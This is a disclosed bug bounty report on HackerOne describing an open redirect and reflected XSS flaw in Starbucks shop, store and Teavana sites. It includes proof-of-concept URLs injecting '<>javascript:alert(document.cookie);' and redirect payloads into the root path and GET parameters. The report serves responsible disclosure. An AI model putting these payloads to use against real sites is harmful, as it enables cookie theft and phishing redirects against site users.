# Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com)

## Report Details
- **Report ID**: 196846
- **URL**: https://hackerone.com/reports/196846
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-09T09:04:56.079Z
- **Disclosed**: 2017-06-14T19:38:58.447Z

## Reporter
- **Username**: inhibitor181
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hello, during some open redirects testing, I have noticed a very strange redirect that occured when I had modified a parameter using something like `>cofee`. I have digged up further and then I have noticed that one can make a redirect by modifying GET parameters with this structure : `<>//google.com`

There seems to be a stripping of tags and after that some chained redirect, that will eventually trigger an XSS vulnerability if the payload is like : `<>javascript:alert(document.cookie);`.

__So, based on this I have noticed that all your websites except the starbucks.* are vulnerable to an XSS payload that is written directly in the root URL or almost ANY other get parameter__, thus making almost all the websites exploitable with multiple injection points (starbucks.* seems not affected)

POC EXAMPLES
-------
```
https://shop.starbucks.de/<>javascript:alert(document.cookie);
https://teavana.com/<>javascript:alert(document.cookie);
https://store.starbucks.com/<>javascript:alert(document.cookie);
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');
```

Bonus - open redirect example :
```
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>//google.com
https://teavana.com/<>//google.com
```

## Attachments
No attachments
